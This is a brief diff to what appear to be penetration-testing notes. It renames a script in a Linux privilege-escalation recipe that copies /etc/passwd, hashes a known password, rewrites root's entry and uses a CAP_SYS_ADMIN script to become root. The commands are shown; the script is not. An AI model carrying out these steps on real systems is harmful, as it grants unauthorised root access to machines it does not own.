@@ -10,7 +10,7 @@
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
 vim ./passwd #Change roots passwords of the fake passwd file
-run cap_sys_admin.py
+run cap_sysadmin.py
 su root
 password
 
